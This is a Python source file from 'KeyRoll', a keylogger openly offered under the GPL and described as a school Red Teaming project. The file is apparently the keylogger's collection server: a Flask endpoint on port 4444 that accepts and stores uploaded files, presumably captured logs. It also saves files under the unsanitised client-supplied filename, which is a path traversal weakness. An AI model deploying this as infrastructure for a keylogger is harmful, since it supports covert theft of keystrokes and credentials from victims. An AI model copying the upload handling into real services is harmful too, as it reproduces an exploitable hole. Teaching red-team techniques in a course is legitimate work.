'''
KeyRoll is a keylogger developed in Python as part of a school project for the Red Teaming course at our Cyber Security school.
Copyright (C) 2024  Federico Carioni - Vincenzo Torchia

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

from flask import Flask, request
import os 


app = Flask(__name__)

@app.route('/receive_file', methods=['POST'])
def ricevi_file():
    try:
        file = request.files['file']

        # Specifica il percorso in cui salvare il file ricevuto
        nome_file_ricevuto = file.filename
        percorso_completo = os.path.join(os.path.join(os.path.expanduser('~'), 'Desktop/ricevuti'), nome_file_ricevuto)

        # Salva il file ricevuto
        file.save(percorso_completo)

        print(f'File ricevuto con successo: {percorso_completo}')

        return 'File ricevuto con successo.'

    except Exception as e:
        print(f'Errore durante il ricevimento del file: {e}')
        return 'Errore durante il ricevimento del file.'

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=4444)
